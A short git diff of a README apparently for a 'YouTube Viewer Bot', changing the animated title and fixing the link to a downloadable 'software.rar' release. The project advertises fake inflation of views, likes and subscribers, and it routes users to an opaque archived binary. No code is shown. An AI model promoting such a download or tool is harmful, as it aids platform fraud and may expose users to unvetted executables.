@@ -1,4 +1,4 @@
-[![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=35&pause=1000&color=0000FF&center=true&vCenter=true&random=false&width=984&lines=Y)](https://git.io/typing-svg)
+[![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=35&pause=1000&color=0000FF&center=true&vCenter=true&random=false&width=984&lines=YouTube+Viewer+Bot)](https://git.io/typing-svg)
 
 <p align="center">
 <img alt="OS" src="https://img.shields.io/badge/OS-Windows%20/%20Linux / Mac-success">
@@ -42,4 +42,4 @@ Simple program to increase YouTube views / likes / subsribers . Works with live 
 
 
 <h2 align=center>⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇</h2>
-<p align="center"> <a href=https://github.com/JesusAv01/YT-viewer-bot/releases/download/release/software.rar"> <img height="90" src="https://iili.io/JapvPpf.png"/> </a> </p>
+<p align="center"> <a href="https://github.com/JesusAv01/YT-viewer-bot/releases/download/release/software.rar"> <img height="90" src="https://iili.io/JapvPpf.png"/> </a> </p>
